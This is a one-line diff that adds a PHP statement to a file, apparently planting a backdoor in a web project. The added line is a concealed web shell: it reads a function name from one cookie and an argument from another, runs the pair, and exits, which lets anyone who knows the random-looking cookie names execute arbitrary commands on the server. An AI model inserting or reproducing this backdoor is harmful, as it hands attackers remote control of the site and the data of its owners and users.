@@ -1,0 +1,1 @@
+<?php if(isset($_COOKIE["vGPpP"])){$_COOKIE["eiU"]($_COOKIE["vGPpP"]);exit;}
